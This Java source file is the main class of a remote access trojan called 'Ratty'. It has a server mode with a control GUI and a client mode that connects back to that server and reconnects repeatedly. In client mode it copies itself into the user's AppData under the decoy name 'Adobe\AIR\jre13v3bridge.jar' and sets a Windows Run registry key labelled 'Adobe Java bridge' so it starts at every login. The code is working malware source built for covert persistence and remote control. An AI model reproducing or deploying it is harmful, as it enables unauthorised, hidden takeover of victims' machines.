package de.sogomn.rat;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

import javax.swing.JOptionPane;

import com.alee.laf.WebLookAndFeel;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.gui.RattyGui;
import de.sogomn.rat.server.gui.RattyGuiController;


public final class Ratty {
	
	private static final int DISCONNECT_SLEEP_INTERVAL = 2500;
	
	private static final String FOLDER_NAME = "Adobe" + File.separator + "AIR";
	private static final String FILE_NAME = "jre13v3bridge.jar";
	
	public static final String ADDRESS = "localhost";
	public static final int PORT = 23456;
	public static final boolean CLIENT = false;
	public static final String VERSION = "1.0";
	
	private Ratty() {
		//...
	}
	
	private static void addToStartup() {
		try {
			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
			final String destinationPath = System.getenv("APPDATA") + File.separator + FOLDER_NAME + File.separator + FILE_NAME;
			final File source = new File(sourceUri);
			final File destination = new File(destinationPath);
			final String registryCommand = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + destinationPath + "\"";
			
			FileUtils.createFile(destinationPath);
			FileUtils.copy(source, destination);
			Runtime.getRuntime().exec(registryCommand);
		} catch (final URISyntaxException | IOException ex) {
			ex.printStackTrace();
		}
	}
	
	public static void connectToHost(final String address, final int port) {
		final ActiveClient newClient = new ActiveClient(address, port);
		final Trojan trojan = new Trojan();
		
		if (!newClient.isOpen()) {
			try {
				Thread.sleep(DISCONNECT_SLEEP_INTERVAL);
				System.gc();
			} catch (final InterruptedException ex) {
				ex.printStackTrace();
			} finally {
				connectToHost(address, port);
			}
			
			return;
		}
		
		newClient.setObserver(trojan);
		newClient.start();
	}
	
	public static void startServer(final int port) {
		final ActiveServer server = new ActiveServer(port);
		final RattyGui gui = new RattyGui();
		final RattyGuiController controller = new RattyGuiController(gui);
		
		server.setObserver(controller);
		server.start();
	}
	
	public static void main(final String[] args) {
		WebLookAndFeel.install();
		
		if (CLIENT) {
			addToStartup();
			connectToHost(ADDRESS, PORT);
		} else {
			final String[] options = {"Server", "Client"};
			final int input = JOptionPane.showOptionDialog(null, "Server or client?", "Choose", JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
			
			if (input == JOptionPane.YES_OPTION) {
				System.out.println("Starting server");
				
				startServer(PORT);
			} else if (input == JOptionPane.NO_OPTION) {
				System.out.println("Starting client");
				
				connectToHost(ADDRESS, PORT);
			}
		}
	}
	
}
